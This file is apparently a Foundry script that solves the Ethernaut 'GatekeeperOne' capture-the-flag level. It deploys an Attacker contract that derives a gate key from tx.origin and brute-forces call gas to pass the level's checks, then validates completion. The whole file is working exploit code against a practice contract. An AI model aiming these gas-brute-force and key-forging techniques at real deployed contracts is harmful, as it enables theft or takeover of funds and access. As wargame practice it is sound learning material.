// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../src/13-GatekeeperOne.sol";
import {GatekeeperOneFactory} from "../src/GatekeeperOneFactory.sol";
import {Script, console} from "forge-std/Script.sol";

contract GatekeeperOneSolution is Script {
    GatekeeperOne public gatekeeperLevel;
    address payable instanceAddress =
        payable(0x858c3c19b05d26194898a93822925D373E28BcD5);
    address public publicKey = vm.envAddress("PUBLIC_KEY");

    function run() external {
        gatekeeperLevel = GatekeeperOne(instanceAddress);

        console.log("Entrant before attack: %s", gatekeeperLevel.entrant());

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(gatekeeperLevel);
        attacker.attack();
        vm.stopBroadcast();

        console.log("Entrant after attack: %s", gatekeeperLevel.entrant());

        validate();
    }

    function validate() internal {
        bool isValidated = new GatekeeperOneFactory().validateInstance(
            instanceAddress,
            publicKey
        );
        console.log("Challenge Completed: %s", isValidated);
    }
}

contract Attacker {
    GatekeeperOne level;

    constructor(GatekeeperOne _level) {
        level = _level;
    }

    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint16(uint160(tx.origin))) + (1 << 32));
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(level).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                return;
            }
        }
    }
}
